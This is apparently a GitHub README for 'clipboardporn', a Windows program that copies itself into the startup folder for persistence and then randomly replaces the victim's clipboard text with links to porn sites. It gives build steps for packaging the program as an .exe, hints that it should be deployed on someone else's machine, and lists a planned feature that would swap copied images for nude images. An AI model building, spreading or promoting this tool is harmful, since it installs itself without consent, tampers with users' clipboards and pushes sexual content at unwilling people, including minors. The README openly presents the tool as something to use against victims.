# clipboardporn
Swaps text from the Windows clipboard for random porn site urls.

This repo includes scripts for compilation into a single ".exe".

The script gets persistance, by copying itself into shell:startup.

Everytime the victim copies text into the clipboard, there's one in three chances that it will be replaced for a random porn site url.

There's about sixteen thousand porn sites url which may be picked.

Enjoy!


## Requirements

- Linux
    1. Python (>=3.7)
        * `sudo pacman -S python`
        * `sudo apt install python3`
    1. wine
        * `sudo pacman -S wine`
        * `sudo apt install wine`
        * `wine-mono` and `wine-gecko` aren't necessary

- Windows
    1. Python (>=3.7, [download here](https://www.python.org/downloads/))


## Quickstart

- Linux
    1. `git clone https://github.com/BrunoFauth/clipboardporn`
    1. `./clipboardporn/build.sh`

- Windows
    1. `git clone https://github.com/BrunoFauth/clipboardporn`
    1. `cd clipboardporn`
    1. `pin install -r requirements.txt`
    1. `build.bat`

- After that, a `dist` directory, containing a cbp build, will have appeared inside the cloned repo. You know what to do then ;D


# TODO

* Swap bitmaps for nudes
